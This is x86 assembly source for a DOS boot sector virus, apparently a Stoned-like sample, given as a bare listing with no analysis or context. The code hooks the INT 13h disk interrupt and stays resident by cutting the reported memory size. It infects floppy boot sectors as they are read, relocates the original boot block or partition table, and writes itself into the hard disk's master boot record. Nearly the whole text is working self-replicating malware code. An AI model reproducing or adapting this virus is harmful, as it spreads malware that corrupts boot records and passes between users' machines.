sample          segment byte public
                assume  cs:sample, ds:sample
                org     0

                jmp     entervirus
highmemjmp      db      0F5h, 00h, 80h, 9Fh
firstsector     dw      3
oldint13h       dd      0C8000256h


int13h:         push    ds                      ; Store needed registers
                push    ax                      ;   "     ""       "
                or      dl, dl                  ; Check for default drive
                jnz     exitint13h              ; If not, check on out
                xor     ax, ax                  ; Clear the AX register to ...
                mov     ds, ax                  ; ... clear the Data Segment
                test    byte ptr ds:[43fh], 1   ; Disk for drive A:
                jnz     exitint13h              ; If it's not in, exit
                pop     ax
                pop     ds
                pushf
                call    dword ptr cs:[oldint13h] ; Postexecution chaining -
                pushf                           ; Call INT 13h, first,
                call    infectdisk              ; Then infect the disk
                popf
                retf    2

exitint13h:     pop     ax                      ; Jumps to the old INT 13h
                pop     ds                      ; Restoring Used Registers
                jmp     dword ptr cs:[oldint13h]

infectdisk:     push    ax bx cx dx ds es si di cs
                pop     ds                      ; Push all registers on the
                push    cs                      ; Stack, and redu the Data &
                pop     es                      ; Extra Segments
                mov     si, 4

readbootblock:  mov     ax,201h                 ; Read into the boot block
                mov     bx,200h                 ; after virus
        mov cx,1
                xor     dx,dx
                pushf
                call    oldint13h
                jnc     checkinfect             ; continue if no error
                xor     ax,ax
                pushf
                call    oldint13h               ; Reset disk, and read in again
                dec     si
                jnz     readbootblock
                jmp     short quitinfect        ; If alot of errors happen, quit

checkinfect:    xor     si,si
                cld
                lodsw
                cmp     ax,[bx]                 ; Read into boot block, and
                jne     infectitnow             ; if it's not infected, then
                lodsw                           ; infect the fucker
                cmp     ax,[bx+2]
                je      quitinfect

infectitnow:    mov     ax,301h                 ; Write old boot block
                mov     dh,1                    ; to head 1, sector 3
                mov     cl,3
                cmp     byte ptr [bx+15h],0FDh  ; is it a 360k disk?
                je      is360Kdisk              ; If it is, then jump
                mov     cl,0Eh

is360Kdisk:     mov     firstsector,cx          ; load 'firstsector' with
                pushf                           ; the floppy disk check
                call    oldint13h
                jc      quitinfect              ; exit if there's an error
                mov     si,200h+offset partitioninfo
                mov     di,offset partitioninfo ; copy the partition table
                mov     cx,21h                  ; info to end of virus
                cld                             ; clear interrupts to work
                rep     movsw                   ; with the stack
                mov     ax,301h                 ; write virus to sector 1
                xor     bx,bx
        mov cx,1
                xor     dx,dx
                pushf
                call    oldint13h               ; do it!

quitinfect:     pop     di si es ds dx cx bx ax ; restore registers, and
                retn                            ; return

; End of TSR Code




; Virus starts here:


entervirus:     xor     ax,ax                   ; clear the data segment
        mov ds,ax
                cli                             ; clear interrupts to work
                mov     ss,ax                   ; with the stack
                mov     ax,7C00h                ; Set stack to just below
                mov     sp,ax                   ; virus load point
                sti
                push    ds                      ; save 0:7C00h on stack for
                push    ax                      ; later return
                mov     ax,ds:[13h*4]           ; set registers up to put
                mov     word ptr ds:[7C00h+offset oldint13h],ax
                mov     ax,ds:[13h*4+2]         ; our interrupt 13h in memory
                mov     word ptr ds:[7C00h+offset oldint13h+2],ax
                mov     ax,ds:[413h]            ; memory size in K
                dec     ax                      ; 1024 K
        dec ax
                mov     ds:[413h],ax            ; calculate memory now
                mov     cl,6
                shl     ax,cl                   ; ax = paragraphs of memory
                mov     es,ax
                mov     word ptr ds:[7C00h+2+offset highmemjmp],ax
                mov     ax,offset int13h        ; set highmemory jump
                mov     ds:[13h*4],ax           ; NOW put our interrupt 13h
                mov     ds:[13h*4+2],es         ; into memory, as part of DOS

; Note: Now we can call interrupt 13h as 'INT 13h', unstead of
;       using 'CALL OLDINT13h', as our int13 is in memory

                mov     cx,offset partitioninfo ; load partition table info
                mov     si,7C00h
                xor     di,di
                cld
                rep     movsb                   ; copy to high memory
                                                ; and transfer control there
                jmp     dword ptr cs:[7C00h+offset highmemjmp]
                xor     ax,ax                   ; destination of highmem jmp
        mov es,ax
                int     13h                     ; reset disk
                push    cs
        pop ds
        mov ax,201h
                mov     bx,7C00h
                mov     cx,firstsector          ; load into into cx register
                cmp     cx,7                    ; is this to infect the hd?
                jne     floppyboot              ; if not, do the floppies
                mov     dx,80h                  ; Read old partition table of
                int     13h                     ; first hard disk to 0:7C00h
                jmp     short exitvirus         ; and exit!

floppyboot:     mov     cx,firstsector          ; read old boot block
                mov     dx,100h                 ; to 0:7C00h
                int     13h
                jc      exitvirus               ; exit on error
        push    cs
        pop es
                mov     ax,201h                 ; read boot block
                mov     bx,200h                 ; of first hard disk
        mov cx,1
        mov dx,80h
                int     13h
                jc      exitvirus               ; exit on error
                xor     si,si
                cld
                lodsw
                cmp     ax,[bx]                 ; is it infected?
                jne     infectharddisk          ; if not, infect hd
                lodsw
        cmp ax,[bx+2]
                jne     infectharddisk          ; go infect the hd

infectharddisk: mov     cx,7                    ; Write partition table to
                mov     firstsector,cx          ; sector 7
        mov ax,301h
        mov dx,80h
                int     13h
                jc      exitvirus               ; exit on error
                mov     si,200h+offset partitioninfo ; Copy partition
                mov     di,offset partitioninfo ; table information
        mov cx,21h
                rep     movsw
                mov     ax,301h                 ; Write to sector 8
                xor     bx,bx                   ; Copy virus to sector 1
        inc cl
                int     13h

exitvirus:      retf                            ; return control to original
                                                ; boot block @ 0:7C00h

partitioninfo:  db      42h dup (0)
sample          ends
                end

